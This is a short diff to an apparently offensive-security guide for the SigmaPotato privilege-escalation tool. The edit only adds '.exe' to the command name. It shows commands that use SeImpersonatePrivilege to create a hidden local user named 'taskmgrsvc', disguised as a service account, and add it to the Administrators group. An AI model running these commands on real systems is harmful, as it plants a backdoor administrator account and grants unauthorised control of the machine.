@@ -76,11 +76,11 @@ SigmaPotato will leverage the `SeImpersonatePrivilege` to execute commands as **
 
 1. **Add a New User**:
    ```powershell
-   .\SigmaPotato "net user taskmgrsvc Password123! /add"
+   .\SigmaPotato.exe "net user taskmgrsvc Password123! /add"
    ```
 2. **Add the User to Administrators Group**:
    ```powershell
-   .\SigmaPotato "net localgroup Administrators taskmgrsvc /add"
+   .\SigmaPotato.exe "net localgroup Administrators taskmgrsvc /add"
    ```
 
 #### Example Output:
